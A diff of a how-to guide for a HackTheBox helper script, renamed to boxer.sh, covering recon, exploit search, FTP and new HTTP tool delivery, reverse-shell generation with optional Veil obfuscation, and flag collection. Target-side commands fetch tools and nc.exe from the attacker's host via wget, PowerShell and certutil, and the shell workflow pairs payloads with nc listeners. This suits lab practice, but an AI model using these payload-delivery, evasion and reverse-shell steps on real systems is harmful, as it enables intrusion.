@@ -1,6 +1,6 @@
-# htb-setup.sh — How-To Guide
+# boxer.sh — How-To Guide
 
-A beginner-friendly guide to `htb-setup.sh`, a helper script that sets up an
+A beginner-friendly guide to `boxer.sh`, a helper script that sets up an
 Ubuntu/Debian host for HackTheBox and automates the repetitive parts of a box:
 tooling, workspace, recon, web attack-surface triage, and privilege-escalation
 analysis.
@@ -27,6 +27,7 @@ analysis.
   - [exploits](#exploits)
   - [roothound](#roothound)
   - [ftp](#ftp)
+  - [http](#http)
   - [shell](#shell)
   - [flags](#flags)
   - [vpn](#vpn)
@@ -39,7 +40,7 @@ analysis.
 
 ## What you get
 
-`htb-setup.sh` is one script with several sub-commands. In a typical session you:
+`boxer.sh` is one script with several sub-commands. In a typical session you:
 
 1. Install your toolset once (`install`).
 2. Spin up a folder for the box you're attacking (`workspace`) — it also adds the
@@ -56,7 +57,7 @@ Companion files that ship alongside the script:
 
 - `tools.txt` — the list of Git tools to auto-install (AutoRecon, PEASS-ng, RootHound).
 - `htb-methodology-cheatsheet.md` — the quick-reference attack workflow.
-- `htb-setup-howto.md` — this document.
+- `boxer-howto.md` — this document.
 
 ---
 
@@ -64,17 +65,17 @@ Companion files that ship alongside the script:
 
 ```bash
 # 1. Make the script executable
-chmod +x htb-setup.sh
+chmod +x boxer.sh
 
 # 2. Put the tools list where the script looks for it
 mkdir -p ~/htb
 cp tools.txt ~/htb/tools.txt
 
 # 3. Install everything (needs sudo)
-./htb-setup.sh install
+./boxer.sh install
 
 # 4. Confirm the toolset is present
-./htb-setup.sh doctor
+./boxer.sh doctor
 ```
 
 Run with a user that has `sudo` — `install`, `/etc/hosts` edits, and the VPN all
@@ -84,16 +85,16 @@ need root.
 
 ## The commands
 
-**New here? Just run `./htb-setup.sh` with no arguments** and you'll get an
+**New here? Just run `./boxer.sh` with no arguments** and you'll get an
 interactive menu that walks you through the next steps (install, connect VPN,
 new box, recon, scan, exploit, deliver tools, privesc). Pick a number and it
 prompts for anything it needs. Every option below can also be run directly as a
-subcommand. Run `./htb-setup.sh help` any time for the summary.
+subcommand. Run `./boxer.sh help` any time for the summary.
 
 ### menu
 
 **What it does:** the interactive "what next?" guide, shown automatically when you
-run the script with no arguments (or explicitly with `./htb-setup.sh menu`). It
+run the script with no arguments (or explicitly with `./boxer.sh menu`). It
 groups the workflow into Setup / Attack a box / Post-exploitation and prompts for
 any values (IP, box name, file paths) a chosen action needs, then loops back for
 the next step. Choose `0` to quit. Options that take over the terminal (VPN,
@@ -109,8 +110,8 @@ always know what's happening:
 ```
 
 ```bash
-./htb-setup.sh          # launches the menu
-./htb-setup.sh menu     # same thing, explicitly
+./boxer.sh          # launches the menu
+./boxer.sh menu     # same thing, explicitly
 ```
 
 
@@ -134,7 +135,7 @@ listed in `tools.txt`.
   [`peass`](#peass) to download the precompiled winPEAS/linPEAS binaries.
 
 ```bash
-./htb-setup.sh install
+./boxer.sh install
 ```
 
 ### tools
@@ -154,8 +155,8 @@ It auto-detects how to install each repo:
 | only shell scripts (e.g. PEASS-ng) | `chmod +x` and reports the path |
 
 ```bash
-./htb-setup.sh tools                                   # use ~/htb/tools.txt
-./htb-setup.sh tools https://github.com/Tib3rius/AutoRecon   # or pass URLs
+./boxer.sh tools                                   # use ~/htb/tools.txt
+./boxer.sh tools https://github.com/Tib3rius/AutoRecon   # or pass URLs
 ```
 
 **Tools shipped in `tools.txt`:**
@@ -183,16 +184,16 @@ By default it grabs: `winPEASx64.exe`, `winPEASx86.exe`, `winPEASany.exe`,
 release via the GitHub API, so you're not pinned to a stale version.
 
 ```bash
-./htb-setup.sh peass                 # into ~/htb/serve/peass
-./htb-setup.sh peass ~/htb/blue/www  # into a specific folder
+./boxer.sh peass                 # into ~/htb/serve/peass
+./boxer.sh peass ~/htb/blue/www  # into a specific folder
 ```
 
 It also runs automatically at the end of `install`. Combine it with the
 [`ftp`](#ftp) server to deliver to a box:
 
 ```bash
-./htb-setup.sh peass
-./htb-setup.sh ftp ~/htb/serve/peass
+./boxer.sh peass
+./boxer.sh ftp ~/htb/serve/peass
 # then on the target:
 #   Windows: (New-Object Net.WebClient).DownloadFile('ftp://<you>/winPEASx64.exe','C:\Windows\Temp\wp.exe')
 #   Linux:   wget ftp://<you>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
@@ -204,7 +205,7 @@ It also runs automatically at the end of `install`. Combine it with the
 tells you what's missing.
 
 ```bash
-./htb-setup.sh doctor
+./boxer.sh doctor
 ```
 
 ### workspace
@@ -214,15 +215,19 @@ tells you what's missing.
 Specifically it:
 
 1. Prompts for the **box name** (if you didn't pass one) — used for the directory.
-2. Prompts for the **box IP** (if you didn't pass one).
+2. Prompts for the **box IP in CIDR notation** and *requires* it — AutoRecon needs
+   a CIDR target or it fails, so for a single host append `/32`
+   (e.g. `10.129.92.12/32`). A bare IP is rejected and re-prompted. The plain IP is
+   derived automatically for `/etc/hosts`, URLs, and notes; the CIDR is what's
+   handed to AutoRecon.
 3. Adds `<ip>  <box>.htb` to **`/etc/hosts`** (replacing any stale entry).
 4. Creates `~/htb/<box>/` with subfolders `nmap/ enum/ exploit/ loot/ www/ autorecon/`.
 5. Writes a `notes.md` template (ports table, creds table, foothold/privesc sections).
 6. Prompts: **"Run AutoRecon against `<ip>` now? [y/N]"** — yes launches recon.
 
 ```bash
-./htb-setup.sh workspace blue            # will prompt for the IP
-./htb-setup.sh workspace blue 10.10.10.40   # IP supplied up front
+./boxer.sh workspace blue            # will prompt for the IP
+./boxer.sh workspace blue 10.10.10.40   # IP supplied up front
 ```
 
 ### recon
@@ -235,7 +240,7 @@ open ports → if web ports are open, `nikto` + `ffuf` directory brute force →
 SMB is open, `smbclient` + `enum4linux`.
 
 ```bash
-./htb-setup.sh recon 10.10.10.40 blue
+./boxer.sh recon 10.10.10.40 blue
 ```
 
 ### websurface
@@ -256,7 +261,7 @@ It flags:
 - **Server-side script targets** — forms posting to `.php` / `.asp` / `.jsp` / `.cgi` / `.py`.
 
 ```bash
-./htb-setup.sh websurface 10.10.10.40 blue
+./boxer.sh websurface 10.10.10.40 blue
 ```
 
 ### secrets
@@ -288,9 +293,9 @@ HTML comment. Findings are de-duplicated and ranked by severity.
 | INFO | Email addresses (useful for username lists) |
 
 ```bash
-./htb-setup.sh secrets 10.10.10.40 blue
+./boxer.sh secrets 10.10.10.40 blue
 # tune the crawl:
-SECRETS_DEPTH=3 SECRETS_MAX_PAGES=80 ./htb-setup.sh secrets 10.10.10.40 blue
+SECRETS_DEPTH=3 SECRETS_MAX_PAGES=80 ./boxer.sh secrets 10.10.10.40 blue
 ```
 
 It also runs **automatically as the final step of the AutoRecon flow**, once
@@ -322,8 +327,22 @@ Each result shows the Exploit-DB ID and title, plus ready-to-run commands:
 - `searchsploit -x <id>` opens the exploit to read it.
 - `searchsploit -m <id>` copies it into your current directory.
 
+Titles that mention remote code/command execution are tagged **`[RCE?]`** and
+sorted to the top of each service block, so the highest-value leads stand out.
+
+**On "auto-running" exploits:** the tool deliberately does *not* download and fire
+exploits for you. Exploit-DB PoCs are frequently version-specific, destructive, or
+booby-trapped, so blindly running them can crash the box or execute untrusted code
+on your own host — and you learn nothing. Instead: read it (`-x`), copy it (`-m`),
+and to *safely* check whether a target is actually vulnerable, use a Metasploit
+module's built-in `check` (it tests without exploiting):
+
+```
+msfconsole -q -x "search <product>; use <module>; set RHOSTS <ip>; check"
+```
+
 ```bash
-./htb-setup.sh exploits blue        # run against a box you've already recon'd
+./boxer.sh exploits blue        # run against a box you've already recon'd
 ```
 
 It also runs **automatically at the end of the AutoRecon flow**. Requires
@@ -344,9 +363,9 @@ escalation attack-path graph at `~/htb/<box>/roothound-report.html`.
 Three modes:
 
 ```bash
-./htb-setup.sh roothound                     # watch ALL boxes' loot/ dirs (recommended)
-./htb-setup.sh roothound blue                # watch just one box
-./htb-setup.sh roothound /path/to/linpeas.txt   # one-shot on a file you already have
+./boxer.sh roothound                     # watch ALL boxes' loot/ dirs (recommended)
+./boxer.sh roothound blue                # watch just one box
+./boxer.sh roothound /path/to/linpeas.txt   # one-shot on a file you already have
 ```
 
 In watch mode it monitors `~/htb/*/loot/` (picking up boxes you create later),
@@ -388,11 +407,11 @@ interface), so you can choose:
 | `<ip>` | bind an explicit IP address |
 
 ```bash
-./htb-setup.sh ftp                            # auto bind, serve ~/htb/serve on :21
-./htb-setup.sh ftp ~/htb/blue/www 2121 eth0   # serve a dir on :2121, bound to eth0
-./htb-setup.sh ftp ~/htb/serve 21 all         # bind all interfaces (Pwnbox-friendly)
-FTP_BIND=10.10.14.7 ./htb-setup.sh ftp        # bind a specific IP via env
-FTP_WRITE=1 ./htb-setup.sh ftp                # also allow the box to upload back to you
+./boxer.sh ftp                            # auto bind, serve ~/htb/serve on :21
+./boxer.sh ftp ~/htb/blue/www 2121 eth0   # serve a dir on :2121, bound to eth0
+./boxer.sh ftp ~/htb/serve 21 all         # bind all interfaces (Pwnbox-friendly)
+FTP_BIND=10.10.14.7 ./boxer.sh ftp        # bind a specific IP via env
+FTP_WRITE=1 ./boxer.sh ftp                # also allow the box to upload back to you
 ```
 
 The interactive menu also prompts for the bind target when you start the server.
@@ -413,6 +432,34 @@ Port 21 needs root, so the script uses `sudo` automatically for privileged ports
 > read (and, in write mode, write) your `serve/` folder. Prefer the narrowest bind
 > that still reaches the target (a specific interface/IP rather than `all`), only
 > put payloads meant for the target in `serve/`, and stop it (Ctrl-C) when done.
+
+### http
+
+**What it does:** serves the same delivery folder (default `~/htb/serve`) over a
+simple HTTP server (`python3 -m http.server`). Use this **when the box blocks
+outbound FTP** — FTP needs extra data connections that egress filtering often
+drops, whereas outbound HTTP almost always works. Same bind options as `ftp`
+(`auto` / `all` / `<iface>` / `<ip>`, via a 3rd argument or `HTTP_BIND`).
+
+```bash
+./boxer.sh http                        # serve ~/htb/serve on :80 (sudo for :80)
+./boxer.sh http ~/htb/serve 8000 tun0  # custom port + interface
+```
+
+On the target:
+
+```bash
+# Linux:
+wget http://<YOUR-IP>/tool.sh -O /tmp/tool.sh
+# Windows (PowerShell):
+(New-Object Net.WebClient).DownloadFile('http://<YOUR-IP>/nc.exe','C:\Windows\Temp\nc.exe')
+# Windows (no PowerShell):
+certutil -urlcache -split -f http://<YOUR-IP>/nc.exe nc.exe
+```
+
+The interactive menu's delivery option (11) **prompts you to choose HTTP or FTP**,
+so you can pick whichever the target allows. HTTP is read-only (download only);
+if you need the box to upload *back* to you, use `ftp` with `FTP_WRITE=1`.
 
 ### shell
 
@@ -451,10 +498,10 @@ Meterpreter (`-met`) variant:
 | `bash` | `cmd/unix/reverse_bash` | `.sh` | nc |
 
 ```bash
-./htb-setup.sh shell                          # interactive picker
-./htb-setup.sh shell linux-elf 10.10.14.7     # generate a Linux ELF shell
-./htb-setup.sh shell windows-met 10.10.14.7 443
-LHOST=10.10.14.7 ./htb-setup.sh shell php
+./boxer.sh shell                          # interactive picker
+./boxer.sh shell linux-elf 10.10.14.7     # generate a Linux ELF shell
+./boxer.sh shell windows-met 10.10.14.7 443
+LHOST=10.10.14.7 ./boxer.sh shell php
 ```
 
 **Optional Veil-obfuscated variant (Windows only).** Pass a 4th argument or set
@@ -467,8 +514,8 @@ msfvenom one. The two are named so you can tell them apart:
   so use a `multi/handler`, which the tool prints)
 
 ```bash
-./htb-setup.sh shell windows-exe 10.10.14.7 4444 1     # both payloads
-SHELL_VEIL=1 ./htb-setup.sh shell windows-met 10.10.14.7
+./boxer.sh shell windows-exe 10.10.14.7 4444 1     # both payloads
+SHELL_VEIL=1 ./boxer.sh shell windows-met 10.10.14.7
 ```
 
 Veil is a standard packaged framework — the script only calls its CLI. It's
@@ -485,9 +532,9 @@ Wine/Go/Python). Override the Veil payload with `VEIL_PAYLOAD=`.
 Typical flow — generate, start the listener, deliver, trigger:
 
 ```bash
-./htb-setup.sh shell windows-exe 10.10.14.7 9001   # writes ~/htb/serve/shell-win-x64.exe
+./boxer.sh shell windows-exe 10.10.14.7 9001   # writes ~/htb/serve/shell-win-x64.exe
 nc -lvnp 9001 &                                     # listener (as printed)
-./htb-setup.sh ftp ~/htb/serve                      # deliver over FTP
+./boxer.sh ftp ~/htb/serve                      # deliver over FTP
 # on the box: download shell-win-x64.exe and run it -> shell lands in your nc
 ```
 
@@ -508,8 +555,8 @@ anything it finds, and flagging files that exist but aren't readable as your
 current user (a hint that privesc is still needed).
 
 ```bash
-./htb-setup.sh flags              # stage into ~/htb/serve
-./htb-setup.sh ftp ~/htb/serve    # deliver over FTP
+./boxer.sh flags              # stage into ~/htb/serve
+./boxer.sh ftp ~/htb/serve    # deliver over FTP
 ```
 
 On the target:
@@ -533,7 +580,7 @@ available standalone as `find-flags.sh` / `find-flags.ps1`.
 **What it does:** connects to a HackTheBox `.ovpn` profile.
 
 ```bash
-./htb-setup.sh vpn ~/Downloads/lab_yourname.ovpn
+./boxer.sh vpn ~/Downloads/lab_yourname.ovpn
 # confirm your tunnel IP:
 ip a show tun0
 ```
@@ -544,15 +591,15 @@ ip a show tun0
 
 ```bash
 # One-time
-chmod +x htb-setup.sh
+chmod +x boxer.sh
 cp tools.txt ~/htb/tools.txt
-./htb-setup.sh install
-./htb-setup.sh doctor
+./boxer.sh install
+./boxer.sh doctor
 
 # Per box
-./htb-setup.sh vpn lab.ovpn                 # (in one terminal) connect to HTB
-./htb-setup.sh roothound                    # (in another terminal) start the privesc watcher
-./htb-setup.sh workspace blue               # prompt IP -> /etc/hosts -> "Run AutoRecon? y"
+./boxer.sh vpn lab.ovpn                 # (in one terminal) connect to HTB
+./boxer.sh roothound                    # (in another terminal) start the privesc watcher
+./boxer.sh workspace blue               # prompt IP -> /etc/hosts -> "Run AutoRecon? y"
 #   AutoRecon maps the box; websurface flags web entry points in parallel.
 
 # ... you find a foothold using the recon + web-surface findings, get a shell ...
@@ -605,11 +652,12 @@ methodology behind each phase.
 | `SECRETS_MAX_PAGES` | `40` | Max pages the `secrets` crawler fetches |
 | `FTP_BIND` | `auto` | FTP bind target: `auto` / `all` / `<iface>` / `<ip>` |
 | `FTP_WRITE` | `0` | Set to `1` to allow the target to upload to your FTP server |
+| `HTTP_BIND` | `auto` | HTTP bind target: `auto` / `all` / `<iface>` / `<ip>` |
 | `LHOST` / `LPORT` | auto / `4444` | Reverse-shell callback IP/port for `shell` |
 | `SHELL_VEIL` | `0` | Set to `1` to also emit a Veil-obfuscated Windows payload |
 | `VEIL_PAYLOAD` | `go/meterpreter/rev_tcp` | Veil payload used for the obfuscated variant |
 
-Example: `HTB_ROOT=/data/htb ./htb-setup.sh workspace blue 10.10.10.40`
+Example: `HTB_ROOT=/data/htb ./boxer.sh workspace blue 10.10.10.40`
 
 ---
 
@@ -624,6 +672,6 @@ Example: `HTB_ROOT=/data/htb ./htb-setup.sh workspace blue 10.10.10.40`
   `inotify-tools` for instant detection instead of 5-second polling.
 - **A Git tool didn't install** — open `~/htb/tools/<name>` and check its README;
   the auto-installer handles common layouts but not every project.
-- **AutoRecon not found when recon starts** — run `./htb-setup.sh install` (or
-  `./htb-setup.sh tools https://github.com/Tib3rius/AutoRecon`); the script falls
+- **AutoRecon not found when recon starts** — run `./boxer.sh install` (or
+  `./boxer.sh tools https://github.com/Tib3rius/AutoRecon`); the script falls
   back to built-in recon in the meantime.
